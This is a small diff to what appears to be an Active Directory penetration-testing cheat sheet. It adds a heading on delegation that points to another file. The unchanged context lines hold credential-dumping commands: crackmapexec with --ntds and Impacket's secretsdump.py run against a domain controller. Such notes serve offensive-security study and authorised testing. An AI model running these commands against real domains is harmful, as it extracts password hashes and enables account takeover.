@@ -127,6 +127,11 @@ crackmapexec smb ip -u user -p pass --ntds
 secretsdump.py domian.com/user:'Pass'@dc.domain.com
 ```
 
+## Allowed to delegate
+
+> Check ADExploitation.md - Constrained Delegation
+
+
 ## DNS Admins
 
 ```bash
